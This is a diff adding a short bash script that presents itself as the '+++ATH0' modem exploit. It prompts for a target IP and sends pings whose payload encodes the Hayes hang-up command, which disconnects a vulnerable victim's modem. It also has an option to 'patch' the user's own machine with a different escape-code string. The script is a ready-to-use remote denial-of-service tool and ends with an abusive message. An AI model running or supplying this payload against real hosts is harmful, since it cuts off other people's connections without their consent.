@@ -1,0 +1,21 @@
+#!/usr/bin/bash
+clear
+echo "+++ATH0 Exploit By Ra@Undernet"
+echo " "
+echo "Choose (1) To Exploit Or (2) To Patch !"
+read ANS1
+if test $ANS1
+	then
+	if test $ANS1 = 1
+		then
+		echo "Give Me The Destination Ip."
+		read ANS2
+		exec ping -p 2b2b2b415448300d $ANS2
+	elif test $ANS1 = 2
+		then
+		echo "Clean +++ATH0 Bug In Your Own Machine."
+		exec ping -p 2b2b2b415453323d32353526574f310d $HOSTNAME
+	fi
+fi
+echo "Fuck You Dumbass, Choose (1) Or (2) Next Time. :>"
+exit 1
